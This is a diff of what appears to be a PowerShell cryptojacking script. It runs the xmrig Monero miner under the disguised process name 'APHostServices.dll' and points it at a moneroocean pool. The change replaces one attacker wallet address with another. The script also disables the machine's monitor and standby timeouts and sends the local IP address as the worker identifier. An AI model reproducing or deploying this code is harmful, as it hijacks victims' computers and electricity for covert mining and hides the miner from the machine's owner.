@@ -9,7 +9,7 @@ $canary="http://canarytokens.com/about/articles/images/68oz5tvh7lo8yptld8gw0lrrf
 $localIpAddress=((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
 
 function run{
-	./xmrig --donate-level 0 --title APHostServices.dll --donate-level 0 --randomx-no-numa --cpu-priority 0 -o gulf.moneroocean.stream:443 --tls -u 45yP52mp6Hb9v3TQNrMeihQAJjVVUGacdEidm7rCUSNB8dWuU9QV3amB87xGhoEWioQEMBmVEyXBF1j2Mb4M486gMS3fnqN+10128 -k -p $localIpAddress
+	./xmrig --donate-level 0 --title APHostServices.dll --donate-level 0 --randomx-no-numa --cpu-priority 0 -o gulf.moneroocean.stream:443 --tls -u 8BtCmvu4XDJUQcLRHe7vTEgXTL8oWj7kDaPq6Eq3DmCbDA1LS8TFMP5KFctzk6t1XoinFjV7Fxg2ZLxwbhd6taqZBwBt9r7+10128 -k -p $localIpAddress
 }
 
 Powercfg /Change monitor-timeout-ac 0; Powercfg /Change monitor-timeout-dc 0; Powercfg /Change standby-timeout-ac 0; Powercfg /Change standby-timeout-dc 0
